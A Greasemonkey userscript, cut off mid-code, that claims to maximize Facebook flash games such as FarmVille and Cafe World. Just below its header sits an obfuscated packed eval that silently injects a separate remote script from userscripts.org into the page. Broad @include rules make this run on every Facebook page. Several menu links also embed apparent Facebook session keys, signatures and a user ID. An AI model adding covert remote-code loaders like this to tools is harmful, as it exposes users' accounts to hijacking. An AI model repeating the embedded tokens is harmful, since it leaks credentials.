// ==UserScript==
// @name           FlashGames Maximizer Plus
// @namespace      http://userscripts.org/users/144415
// @description    Maximizes flashgames. Removes all anoying boxes and whitespaces around the flash in facebook and some external sites.
// @Copyright      Sebastian Fischer
// @version        3.1.3.86
// @license        http://creativecommons.org/licenses/by-nc-nd/3.0/us/
// @include        *facebook.com/black_jack/*
// @include        *facebook.com/backyardmonsters/*
// @include        *fb.casualcollective.com/*
// @include        *facebook.com/cartown/*
// @include        *facebook.com/countrylife/*
// @include        *countrylife.joyeurs.com/my_ranch/*
// @include        *cartown.com/cartown/*
// @include        *facebook.com/cafeworld/*
// @include        *cafe.zynga.com/*
// @include        *apps.facebook.com/farmtown/*
// @include        *.slashkey.com/*
// @include        *facebook.com/onthefarm/*
// @include        *farmville.com/*
// @include        *facebook.com/fishville/*
// @include        *fishville.zynga.com/*
// @include        *facebook.com/frontierville/*
// @include        *frontier.zynga.com/*
// @include        *apps.facebook.com/myownisland/*
// @include        *apps.meteorgames.com/facebook/island/*
// @include        *facebook.com/pathwords/*
// @include        *74.201.93.95/*
// @include        *facebook.com/petvillegame/*
// @include        *petville.zynga.com*
// @include        *facebook.com/coasterkingdom/*
// @include        *coaster.zynga.com*
// @include        *facebook.com/texas_holdem/*
// @include        *poker.zynga.com*
// @include        *facebook.com/treasureisle/*
// @include        *treasure.zynga.com/*
// @include        *facebook.com/wordtwist/*
// @include        *74.201.93.101*
// @include        *facebook.com/yoville/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        *yoville.com/*
// @include        *apps.facebook.com/zoo-paradise/*
// @include        *zoo.crowdstar.com/*
// @require        http://fvmaximizer.googlecode.com/files/jquerygmfix.js
// @require        http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js
// @require        http://fvmaximizer.googlecode.com/files/fgm-styles.js
// @require        http://fvmaximizer.googlecode.com/files/fv-tools.js
// @require        http://sizzlemctwizzle.com/updater.php?id=73361&days=1&var=FGM&show
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var SCRIPT = {
	title: 'FlashGames Maximizer',
	presentationurl: 'http://userscripts.org/scripts/show/73361',
	games: {
		bj: {
			name: 'Blackjack',
			styles: 'Blackjack',
			selector: '#app_content_5803363687 .__fbswf embed',
			hostname: /apps\.facebook\.com/,
			pathname: /\/black_jack/,
			exclude: new Array(
				/helpframe\.php/,
				/invite_condensed\.php/,
				/leader_board\.php/,
				/new_invite_post\.php/,
				/playa\.php/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/black_jack/invite.php?type=7', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/black_jack/playa.php', label: 'My Profile'},
				{href: 'http://apps.facebook.com/black_jack/leader_board.php', label: 'Leaderboard'},
				{href: 'http://apps.facebook.com/black_jack/helpframe.php', label: 'How To Play'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		bj_iframe: {},
		bm: {
			name: 'Backyard Monsters',
			styles: 'Backyardmonsters',
			selector: '#app342684208824_content-iframe',
			hostname: /apps\.facebook\.com/,
			pathname: /\/backyardmonsters/,
			exclude: new Array(
			),
			menuitems: new Array(
				{href: 'http://bm.lb4.fb.casualcollective.com/canvas/playiframe', label: 'Free Gifts'},
				{href: 'http://bm.lb4.fb.casualcollective.com/canvas/attacklogiframe', label: 'Attack Log'},
				{href: 'http://bm.lb4.fb.casualcollective.com/canvas/playiframe', label: 'Invite Friends'},
				{href: 'http://forums.casualcollective.com/forums/2-Backyard-Monsters', label: 'Discuss'},
				{href: 'http://bm.lb4.fb.casualcollective.com/canvas/topupiframe', label: 'Get More Shiny'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		bm_iframe: {
			selector: '#gameswf',
			hostname: /\.fb\.casualcollective\.com/,
			pathname: /canvas\/playiframe/,
			exclude: new Array(
			)
		},
		cl: {
			name: 'Country Life',
			styles: 'Countrylife',
			selector: '#app26947445683_container > iframe',
			hostname: /apps\.facebook\.com/,
			pathname: /\/countrylife/,
			exclude: new Array(
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/countrylife/gifts', label: 'Free Gifts'},
				{href: 'http://apps.facebook.com/countrylife/neighbors', label: 'My Neighbors'},
				{href: 'http://apps.facebook.com/countrylife/invite', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/countrylife/offers', label: 'Add Ranch Cash'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		cl_iframe: {
			selector: '#game_div',
			hostname: /countrylife\.joyeurs\.com/,
			pathname: /my_ranch\/iframe_content_/,
			exclude: new Array(
			)
		},
		ct: {
			name: 'Car Town',
			styles: 'Cartown',
			selector: '#app256799621935_main_body iframe',
			hostname: /apps\.facebook\.com/,
			pathname: /\/cartown/,
			exclude: new Array(
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/cartown/invite.jsp', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/cartown/addCredits.jsp', label: 'Get Coins & Points'},
				{href: 'http://www.facebook.com/CarTown/', label: 'We love Car Town!'},
				{href: 'http://www.cartown.com/faq.html', label: 'Help'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		ct_iframe: {
			selector: '#game_div',
			//notice: '#game_shoutout',
			hostname: /game\.cartown\.com/,
			pathname: /\/cartown\/flashIFrame\.jsp/,
			exclude: new Array(
			)
		},
		cw: {
			name: 'Cafe World',
			styles: 'CafeWorld',
			selector: '#app_content_101539264719 iframe[src*=/fb//iframe.php]',
			hostname: /apps\.facebook\.com/,
			pathname: /\/cafeworld/,
			exclude: new Array(
				/accept_chef_special\.php/,
				/accept_request\.php/,
				/build_a_stove_friend_helping_page\.php/,
				/gift_cards\.php/,
				/help\.php/,
				/invite\.php/,
				/money\//,
				/neighbors\.php/,
				/send_gift\.php/,
				/view_gift\.php/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/cafeworld/view_gift.php', label: 'Free Gifts'},
				{href: 'http://apps.facebook.com/cafeworld/neighbors.php', label: 'Neighbors'},
				{href: 'http://apps.facebook.com/cafeworld/invite.php', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/cafeworld/money/', label: 'Coins & Cash'},
				{href: 'http://apps.facebook.com/cafeworld/money/earn.php', label: 'Earn Café Cash'},
				{href: 'http://apps.facebook.com/cafeworld/money/?page=paypal_promo&paytype=pp&packageid=204', label: 'PayPal Discount'},
				{href: 'http://apps.facebook.com/cafeworld/help.php', label: 'Help'},
				{href: 'http://apps.facebook.com/cafeworld/gift_cards.php', label: 'Game Card'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		cw_iframe: {
			selector: '#game_div',
			styles: 'CafeWorld',
			notice: '#game_shoutout',
			hostname: /cafe\.zynga\.com/,
			pathname: /\/iframe\.php/,
			exclude: new Array(
			)
		},
		ft: {
			name: 'Farm Town',
			styles: 'FarmTown',
			selector: '#app56748925791_game_ctr iframe',
			hostname: /apps\.facebook\.com/,
			pathname: /\/farmtown/,
			exclude: new Array(
				/\/send/,
				/\/friends/,
				/\/invite/,
				/\/settings/,
				/\/offers/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/farmtown/send/', label: 'Send Gifts'},
				{href: 'http://apps.facebook.com/farmtown/friends/', label: 'Neighbors'},
				{href: 'http://apps.facebook.com/farmtown/invite/', label: 'Invite'},
				{href: 'http://r1.slashkey.com/forum/forumdisplay.php?f=54', label: 'Forums & Help'},
				{href: 'http://apps.facebook.com/farmtown/settings/', label: 'Account'},
				{href: 'http://apps.facebook.com/farmtown/offers/', label: 'Earn Cash and Coins'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		ft_iframe: {
			selector: '#FarmTown',
			notice: '#game_shoutout',
			hostname: /\.slashkey\.com/,
			pathname: /\/play_flash/,
			exclude: new Array(
			)
		},
		favfb: {
			name: 'FarmVille in Facebook',
			styles: 'FarmVille',
			notice: '.noticebox',
			selector: '#app_content_102452128776 iframe[src*=/flash.php]',
			hostname: /apps\.facebook\.com/,
			pathname: /\/onthefarm/,
			exclude: new Array(
				/askcredits\.php/,
				/askmats\.php/,
				/fans\.php/,
				/giftaccept.php/,
				/gifts\.php/,
				/gifts_send\.php/,
				/invite\.php/,
				/money\.php/,
				/neighbors\.php/,
				/reward\.php/,
				/sendcredits\.php/,
				/sendmats\.php/,
				/sentthankyougift\.php/,
				/track\.php/,
				/wishlist_give\.php/,

				/session\.php/,
				/xd_receiver\.htm/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/onthefarm/gifts.php', label: 'Gifts'},
				{href: 'http://apps.facebook.com/onthefarm/neighbors.php', label: 'Neighbors'},
				{href: 'http://apps.facebook.com/onthefarm/invite.php', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/onthefarm/money.php', label: 'Coins & Cash'},
				{href: 'http://apps.facebook.com/onthefarm/fans.php', label: 'Love FarmVille?'},
				{href: 'http://www.facebook.com/', label: 'Facebook'},
				{click: function() {new FarmvilleTool();}, label: 'Seed Calc'}
			)
		},
		favfv: {
			name: 'FarmVille in farmville.com',
			styles: 'FarmVille',
			notice: '.noticebox',
			selector: '#flashIframeWrapper iframe',
			hostname: /farmville\.com/,
			pathname: /\/+/,
			exclude: new Array(
				/askmats\.php/,
				/fans\.php/,
				/giftaccept.php/,
				/gifts\.php/,
				/gifts_send\.php/,
				/invite\.php/,
				/money\.php/,
				/neighbors\.php/,
				/reward\.php/,
				/sendmats\.php/,
				/sentthankyougift\.php/,
				/track\.php/,
				/wishlist_give\.php/,

				/populateFbCache\.php/,
				/promo_bar\.php/,
				/session\.php/,
				/xd_receiver\.htm/
			),
			menuitems: new Array(
				{href: 'http://www.farmville.com/gifts.php', label: 'Gifts'},
				{href: 'http://www.farmville.com/neighbors.php', label: 'Neighbors'},
				{href: 'http://www.farmville.com/invite.php', label: 'Invite Friends'},
				{href: 'http://www.farmville.com/money.php', label: 'Coins & Cash'},
				{href: 'http://www.farmville.com/settings.php', label: 'Settings'}
			)
		},
		fav_iframe: {
			selector: '#flashapp',
			hostname: /farmville\.com/,
			pathname: /\/flash.php/,
			exclude: new Array(
			)
		},
		fiv: {
			name: 'FishVille',
			styles: 'FishVille',
			selector: '#app151044809337_iframe_canvas',
			hostname: /apps\.facebook\.com/,
			pathname: /\/fishville/,
			exclude: new Array(
				/giftaccept\.php/,
				/gifts\.php/,
				/gifts_send\.php/,
				/giftwarehouse_sendgift\.php/,
				/help\.php/,
				/invite\.php/,
				/money\.php/,
				/neighbors\.php/
			),
			menuitems: new Array(
				{href: 'http://facebook.fishville.zynga.com/public/gifts.php?appRef=tab&fb_sig_in_iframe=1&fb_sig_iframe_key=c16a5320fa475530d9583c34fd356ef5&fb_sig_base_domain=zynga.com&fb_sig_locale=de_DE&fb_sig_in_new_facebook=1&fb_sig_time=1275371913.8534&fb_sig_added=1&fb_sig_profile_update_time=1274007175&fb_sig_expires=1275375600&fb_sig_user=100001095836253&fb_sig_session_key=2.yLNAoNbvqhPDEeaZCZDSIw__.3600.1275375600-100001095836253&fb_sig_ss=KyGYbgcsnv00OUjPCLhALQ__&fb_sig_cookie_sig=035a56300f75f545d2e44582c92c7652&fb_sig_ext_perms=auto_publish_recent_activity&fb_sig_country=de&fb_sig_api_key=35ce387ed7e8e0aace333fbc5e76cf0f&fb_sig_app_id=151044809337&fb_sig=eeb9c5ea1afac36656c98ecb05511292', label: 'Free Gifts'},
				{href: 'http://facebook.fishville.zynga.com/public/neighbors.php?appRef=tab&fb_sig_in_iframe=1&fb_sig_iframe_key=c16a5320fa475530d9583c34fd356ef5&fb_sig_base_domain=zynga.com&fb_sig_locale=de_DE&fb_sig_in_new_facebook=1&fb_sig_time=1275371913.8534&fb_sig_added=1&fb_sig_profile_update_time=1274007175&fb_sig_expires=1275375600&fb_sig_user=100001095836253&fb_sig_session_key=2.yLNAoNbvqhPDEeaZCZDSIw__.3600.1275375600-100001095836253&fb_sig_ss=KyGYbgcsnv00OUjPCLhALQ__&fb_sig_cookie_sig=035a56300f75f545d2e44582c92c7652&fb_sig_ext_perms=auto_publish_recent_activity&fb_sig_country=de&fb_sig_api_key=35ce387ed7e8e0aace333fbc5e76cf0f&fb_sig_app_id=151044809337&fb_sig=eeb9c5ea1afac36656c98ecb05511292', label: 'Neighbors'},
				{href: 'http://facebook.fishville.zynga.com/public/invite.php?appRef=tab&fb_sig_in_iframe=1&fb_sig_iframe_key=c16a5320fa475530d9583c34fd356ef5&fb_sig_base_domain=zynga.com&fb_sig_locale=de_DE&fb_sig_in_new_facebook=1&fb_sig_time=1275371913.8534&fb_sig_added=1&fb_sig_profile_update_time=1274007175&fb_sig_expires=1275375600&fb_sig_user=100001095836253&fb_sig_session_key=2.yLNAoNbvqhPDEeaZCZDSIw__.3600.1275375600-100001095836253&fb_sig_ss=KyGYbgcsnv00OUjPCLhALQ__&fb_sig_cookie_sig=035a56300f75f545d2e44582c92c7652&fb_sig_ext_perms=auto_publish_recent_activity&fb_sig_country=de&fb_sig_api_key=35ce387ed7e8e0aace333fbc5e76cf0f&fb_sig_app_id=151044809337&fb_sig=eeb9c5ea1afac36656c98ecb05511292', label: 'Invite Friends'},
				{href: 'http://facebook.fishville.zynga.com/public/money.php?appRef=tab&fb_sig_in_iframe=1&fb_sig_iframe_key=c16a5320fa475530d9583c34fd356ef5&fb_sig_base_domain=zynga.com&fb_sig_locale=de_DE&fb_sig_in_new_facebook=1&fb_sig_time=1275371913.8534&fb_sig_added=1&fb_sig_profile_update_time=1274007175&fb_sig_expires=1275375600&fb_sig_user=100001095836253&fb_sig_session_key=2.yLNAoNbvqhPDEeaZCZDSIw__.3600.1275375600-100001095836253&fb_sig_ss=KyGYbgcsnv00OUjPCLhALQ__&fb_sig_cookie_sig=035a56300f75f545d2e44582c92c7652&fb_sig_ext_perms=auto_publish_recent_activity&fb_sig_country=de&fb_sig_api_key=35ce387ed7e8e0aace333fbc5e76cf0f&fb_sig_app_id=151044809337&fb_sig=eeb9c5ea1afac36656c98ecb05511292', label: 'Add Sand Dollars'},
				{href: 'http://facebook.fishville.zynga.com/public/help.php?appRef=tab&fb_sig_in_iframe=1&fb_sig_iframe_key=c16a5320fa475530d9583c34fd356ef5&fb_sig_base_domain=zynga.com&fb_sig_locale=de_DE&fb_sig_in_new_facebook=1&fb_sig_time=1275371913.8534&fb_sig_added=1&fb_sig_profile_update_time=1274007175&fb_sig_expires=1275375600&fb_sig_user=100001095836253&fb_sig_session_key=2.yLNAoNbvqhPDEeaZCZDSIw__.3600.1275375600-100001095836253&fb_sig_ss=KyGYbgcsnv00OUjPCLhALQ__&fb_sig_cookie_sig=035a56300f75f545d2e44582c92c7652&fb_sig_ext_perms=auto_publish_recent_activity&fb_sig_country=de&fb_sig_api_key=35ce387ed7e8e0aace333fbc5e76cf0f&fb_sig_app_id=151044809337&fb_sig=eeb9c5ea1afac36656c98ecb05511292', label: 'Help'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		fiv_iframe: {
			styles: 'FishVille',
			selector: '#flashapp',
			hostname: /fishville\.zynga\.com/,
			pathname: /public\/index\.php/,
			exclude: new Array(
			)
		},
		frv: {
			name: 'FrontierVille',
			styles: 'FrontierVille',
			selector: '#app_content_201278444497 .canvas_iframe_util',
			hostname: /apps\.facebook\.com/,
			pathname: /\/frontierville/,
			exclude: new Array(
				/gift_request_accept\.php/,
				/giftaccept\.php/,
				/gifts\.php/,
				/help\.php/,
				/invite\.php/,
				/money\.php/,
				/money2\.php/,
				/neighbors\.php/,
				/reward\.php/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/frontierville/gifts.php', label: 'Gifts'},
				{href: 'http://apps.facebook.com/frontierville/neighbors.php', label: 'Neighbors'},
				{href: 'http://apps.facebook.com/frontierville/invite.php', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/frontierville/help.php', label: 'Help'},
				{href: 'http://apps.facebook.com/frontierville/money.php', label: 'Sale on Horseshoes'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		frv_iframe: {
			styles: 'FrontierVille',
			selector: '#flashDIV',
			notice: '.noticebox',
			hostname: /frontier\.zynga\.com/,
			pathname: /flash\.php/,
			exclude: new Array(
				/giftaccept\.php/,
				/gifts\.php/
			)
		},
		ip: {
			name: 'Island Paradise',
			styles: 'IslandParadise',
			selector: '#app94483022361_iframe_canvas',
			hostname: /apps\.facebook\.com/,
			pathname: /\/myownisland\//,
			exclude: new Array(
			),
			menuitems: new Array(
				{href: 'http://apps.meteorgames.com/facebook/island/gift/send_index', label: 'Send Gifts'},
				{href: 'http://apps.meteorgames.com/facebook/island/friends/invite', label: 'Invite'},
				{href: 'http://apps.meteorgames.com/facebook/island/language/index', label: 'Language'},
				{href: 'http://apps.meteorgames.com/facebook/island/meteorstore/earn_credits', label: '+ Add Coins and Credits'},
				{href: 'http://apps.meteorgames.com/facebook/island/help/index', label: 'Help'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		ip_iframe: {
			styles: 'IslandParadise',
			selector: '#island',
			notice: '.noticebox',
			hostname: /apps\.meteorgames\.com/,
			pathname: /facebook\/island\//,
			exclude: new Array(
			)
		},
		pw: {
			name: 'Path Words',
			styles: 'PathWords',
			selector: '#app_content_12271981887 iframe[src*=/liveplayframe.php]',
			hostname: /apps\.facebook\.com/,
			pathname: /\/pathwords/,
			exclude: new Array(
				/mode\=invite/,
				/mode\=join/,
				/mode\=tb/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/pathwords/index.php?mode=tb', label: 'My Games'},
				{href: 'http://apps.facebook.com/pathwords/index.php?mode=join', label: 'Play Anyone'},
				{href: 'http://apps.facebook.com/pathwords/index.php?mode=invite', label: 'Invite Friends'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		pw_iframe: {
			selector: '#TumbleWords',
			hostname: /74\.201\.93\.95/,
			pathname: /\/pathwords\/liveplayframe\.php/,
			exclude: new Array(
			)
		},
		pv: {
			name: 'PetVille',
			styles: 'PetVille',
			selector: '#app163576248142_mainframe',
			hostname: /apps\.facebook\.com/,
			pathname: /\/petvillegame/,
			exclude: new Array(
				/addneighbor\.php/,
				/askformore_accept\.php/,
				/giftaccept\.php/,
				/gifts\.php/,
				/help\.php/,
				/invite\.php/,
				/money\.php/,
				/neighbors\.php/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/petvillegame/gifts.php', label: 'Free Gifts'},
				{href: 'http://apps.facebook.com/petvillegame/neighbors.php', label: 'My Neighbors'},
				{href: 'http://apps.facebook.com/petvillegame/invite.php', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/petvillegame/becomeFan.php', label: 'Fan Page'},
				{href: 'http://apps.facebook.com/petvillegame/help.php', label: 'Help'},
				{href: 'http://apps.facebook.com/petvillegame/money.php', label: 'Get Pet Coins & Cash'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		pv_iframe: {
			selector: '#flashapp',
			hostname: /petville\.zynga\.com/,
			pathname: /\/current\/flash\.php/,
			exclude: new Array(
			)
		},
		pv_outerframe: {
			styles: 'PetVille',
			notice: '.noticebox',
			selector: '#flashiframe',
			hostname: /petville\.zynga\.com/,
			pathname: /\/current\/main\.php/,
			exclude: new Array(
			)
		},
		rck: {
			name: 'Roller Coaster Kingdom',
			styles: 'RCKingdom',
			selector: '#app_content_89771452035 iframe#app89771452035_eventtest',
			hostname: /apps\.facebook\.com/,
			pathname: /\/coasterkingdom/,
			exclude: new Array(
				/help\.php/,
				/invite\.php/,
				/money/,
				/neighbors/,
				/view_gifts\.php/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/coasterkingdom/view_gifts.php', label: 'Free Gifts'},
				{href: 'http://apps.facebook.com/coasterkingdom/neighbors', label: 'My Neighbors'},
				{href: 'http://apps.facebook.com/coasterkingdom/invite.php', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/coasterkingdom/money', label: 'Get More Coaster Cash'},
				{href: 'http://apps.facebook.com/coasterkingdom/help.php', label: 'Help'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		rck_iframe: {
			selector: '#flash_game',
			hostname: /coaster\.zynga\.com/,
			pathname: /\/play\.php/,
			exclude: new Array(
			)
		},
		th: {
			name: 'Texas HoldEm Poker',
			styles: 'TexasHoldEm',
			selector: '#app2389801228_zyPokerSWF iframe',
			hostname: /apps\.facebook\.com/,
			pathname: /\/texas_holdem/,
			exclude: new Array(
				/guidelines\.php/,
				/helpframe\.php/,
				/invite_gift_claim\.php/,
				/settings\.php/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/texas_holdem/dmz_link_landing.php?src_track_str=Poker+FB+Invite_Page+Other+%25ACTION%25+o%3AHelp%3A2009-02-11&url=http%3A%2F%2Fapps.facebook.com%2Ftexas_holdem%2Fhelpframe.php', label: 'Help'},
				{href: 'http://apps.facebook.com/texas_holdem/dmz_link_landing.php?src_track_str=Poker+FB+Invite_Page+Other+%25ACTION%25+o%3ASettings%3A2009-02-11&url=http%3A%2F%2Fapps.facebook.com%2Ftexas_holdem%2Fsettings.php', label: 'Settings'},
				{href: 'http://apps.facebook.com/texas_holdem/dmz_link_landing.php?src_track_str=Poker+FB+Invite_Page+Other+%25ACTION%25+o%3ATOS%3A2009-02-11&url=http%3A%2F%2Fwww.zynga.com%2Flegal%2Fterms_of_service.php', label: 'Terms of Service'},
				{href: 'http://zynga.custhelp.com/app/home/gameid/1/sn/1', label: 'Support'},
				{href: 'http://apps.facebook.com/texas_holdem/dmz_link_landing.php?src_track_str=Poker+FB+Invite_Page+Other+%25ACTION%25+o%3AGuidelines%3A2009-02-11&url=http%3A%2F%2Fapps.facebook.com%2Ftexas_holdem%2Fguidelines.php', label: 'Guidelines'},
				{href: 'http://apps.facebook.com/texas_holdem/dmz_link_landing.php?src_track_str=Poker+FB+Invite_Page+Other+%25ACTION%25+o%3APrivacy%3A2009-02-11&url=http%3A%2F%2Fwww.zynga.com%2FprivacyPolicy%2F', label: 'Privacy Info'},
				{href: 'http://forums.zynga.com/forumdisplay.php?f=60', label: 'Forum'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		th_iframe: {
			selector: '#pokerSwfId',
			hostname: /poker\.zynga\.com/,
			pathname: /poker\/launch\.php/,
			exclude: new Array(
			)
		},
		ti: {
			name: 'Treasure Isle',
			styles: 'TreasureIsle',
			selector: '#app_content_234860566661 iframe[src*=/flash.php]',
			hostname: /apps\.facebook\.com/,
			pathname: /\/treasureisle/,
			exclude: new Array(
				/ask_fruit\.php/,
				/energy_pack\.php/,
				/gift_accept\.php/,
				/reward\.php/
			),
			menuitems: new Array(
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		ti_iframe: {
			selector: '#flashapp',
			styles: 'TreasureIsle',
			hostname: /treasure\.zynga\.com/,
			pathname: /\/flash.php/,
			exclude: new Array(
			)
		},
		wt: {
			name: 'Word Twist',
			styles: 'WordTwist',
			selector: '#app_content_8567719845 iframe[src*=liveplayframe.php]',
			hostname: /apps\.facebook\.com/,
			pathname: /\/wordtwist/,
			exclude: new Array(
				/mode\=create/,
				/mode\=invite/,
				/mode\=tb/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/wordtwist/index.php?mode=create', label: 'Start a Game'},
				{href: 'http://apps.facebook.com/wordtwist/index.php?mode=tb', label: 'My Games'},
				{href: 'http://apps.facebook.com/wordtwist/index.php?mode=invite', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/wordtwist/index.php?mode=live', label: 'Ladder Mode'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		wt_iframe: {
			selector: '#WordTwist',
			hostname: /74\.201\.93\.101/,
			pathname: /wordtwist\/liveplayframe\.php/,
			exclude: new Array(
			)
		},
		yvfb: {
			name: 'YoVille in Facebook',
			styles: 'Yoville',
			selector: '#app_content_21526880407 iframe[src*=/indexnew.php]',
			hostname: /apps\.facebook\.com/,
			pathname: /\/yoville/,
			exclude: new Array(
				/game_cards\.php/,
				/invites\.php/,
				/my_crew\.php/,
				/send_gifts\.php/,
				/view_gifts\.php/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/yoville/view_gifts.php?bypass_reminder=1&', label: 'Free Gifts'},
				{href: 'http://apps.facebook.com/yoville/my_crew.php?', label: 'Neighbors'},
				{href: 'http://apps.facebook.com/yoville/invites.php?ref=topnav&', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/yoville/game_cards.php?', label: 'Game Cards'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		yvyv: {
			name: 'YoVille in yoville.com',
			styles: 'Yoville',
			selector: '#maincontent iframe[src*=play.php]',
			hostname: /yoville\.com/,
			pathname: /\/app\.php/,
			exclude: new Array(
			),
			menuitems: new Array(
				{href: 'http://www.yoville.com/profile/', label: 'Profile'},
				{href: 'http://www.yoville.com/items/', label: 'Items'},
				{href: 'http://www.yoville.com/contests/', label: 'Contests'},
				{href: 'http://www.yoville.com/clubs/', label: 'Clubs'},
				{href: 'http://www.yoville.com/forum/', label: 'Forum'},
				{href: 'http://www.yoville.com/blog/', label: 'Blog'},
				{href: 'http://www.yoville.com/home/', label: 'Home'}
			)
		},
		yv_iframe: {
			selector: '#mylife',
			hostname: /yoville.com/,
			pathname: /indexnew\.php|play\.php/,
			exclude: new Array(
			)
		},
		zp: {
			name: 'Zoo Paradise',
			styles: 'ZooParadise',
			selector: '#app_content_339444600959 .body iframe',
			hostname: /apps\.facebook\.com/,
			pathname: /\/zoo-paradise\//,
			exclude: new Array(
				/\?target=neighbors_page/,
				/\?target=gift_page/,
				/\?target=invite_friends/,
				/\?target=support/
			),
			menuitems: new Array(
				{href: 'http://apps.facebook.com/zoo-paradise/?target=neighbors_page', label: 'My Neighbors'},
				{href: 'http://apps.facebook.com/zoo-paradise/?target=gift_page', label: 'Free Gifts'},
				{href: 'http://apps.facebook.com/zoo-paradise/?target=invite_friends', label: 'Invite Friends'},
				{href: 'http://apps.facebook.com/zoo-paradise/?target=support', label: 'Help'},
				{href: 'http://www.facebook.com/', label: 'Facebook'}
			)
		},
		zp_iframe: {
			selector: '#flashcontent',
			hostname: /zoo\.crowdstar\.com/,
			pathname: /\/iframe\//,
			exclude: new Array(
			)
		}
	}
};



var active = true;
if (typeof(GM_getValue) != 'undefined' &&
		typeof(GM_getValue('a', 'b')) != 'undefined') {
	active = GM_getValue('active', true);

	function activate() {
		storeState(true);
	}

	function deactivate() {
		storeState(false);
	}

	function storeState(state) {
		GM_setValue('active', state);
		window.location.reload();
	}

	if (active) {
		GM_registerMenuCommand('Deactivate ' + SCRIPT.title, deactivate);
	} else {
		GM_registerMenuCommand('Activate ' + SCRIPT.title, activate);
	}
}



if (active) {
	var debug = false;
	var mmObj = new Maximizer()
		.injectDefaultStyles();

	jQuery(document).ready(function() {
		mmObj.maximizeWindow();
	});
}



var $stylesChanged = jQuery.event.special.stylesChanged = {
	active: true,

	setup: function(data, namespaces) {
		jQuery(this).bind('DOMAttrModified', $stylesChanged.handler);
	},

	teardown: function(namespaces) {
		jQuery(this).unbind('DOMAttrModified');
	},

	handler: function(event) {
		if (event.attrName === 'style' && $stylesChanged.active) {
			$stylesChanged.active = false;

			jQuery(this).triggerHandler('stylesChanged');

			$stylesChanged.active = true;
		}
	}
};

var $elementCreated = jQuery.event.special.elementCreated = {
	setup: function(data, namespaces) {
		jQuery(this).data('elementCreated', data);
		jQuery(this).bind('DOMNodeInserted', $elementCreated.handler);
	},

	teardown: function(namespaces) {
		jQuery(this).unbind('DOMNodeInserted');
	},

	handler: function(event) {
		var data = jQuery(this).data('elementCreated'),
			$compareWith = jQuery(data.selector);
		if ($compareWith[0] == event.target) {
			jQuery(this).triggerHandler('elementCreated');
		}
	}
};



/**
 * Maximizer object
 *
 * @return	void
 */
function Maximizer() {
	this.styles = null;

	this.windowType = null;

	this.timeout_close = null;

	/**
	 * Initialization of the object
	 *
	 * @return	boolean
	 */
	this.__construct = function() {
		this.styles = new Styles();
		this.windowType = this.getWindowType();
		this.settings = SCRIPT.games[this.windowType];
	};

	/**
	 * Inject the common styles into the head node
	 *
	 * @return	object
	 */
	this.injectDefaultStyles = function() {
		if (this.windowType != null) {
			this.styles.injectStyles(this.styles.getDefaultStyles());
		}

		return this;
	};

	/**
	 * Maximize the content element in the window with current windows settings
	 *
	 * @return	object
	 */
	this.maximizeWindow = function() {
		var self = this,
			settings = self.settings;

		switch(self.windowType) {
			case 'favfb':
			case 'favfv':
			case 'fiv':
			case 'frv':
			case 'ip':
			case 'pv':
			case 'ti':
				self.manipulateElement(settings.selector)
					.bind(
					'stylesChanged',
					{height: '100%', width: '100%'},
					function(event, property) {
						for (var key in event.data) {
							if (jQuery(this).css(key) != event.data[key]) {
								jQuery(this).css(key, event.data[key]);
							}
						}
					}
				);
				break;

			case 'bm_iframe':
			case 'cl_iframe':
			case 'ct_iframe':
			case 'cw_iframe':
			case 'ft_iframe':
			case 'fav_iframe':
			case 'fiv_iframe':
			case 'frv_iframe':
			case 'ip_iframe':
			case 'pw_iframe':
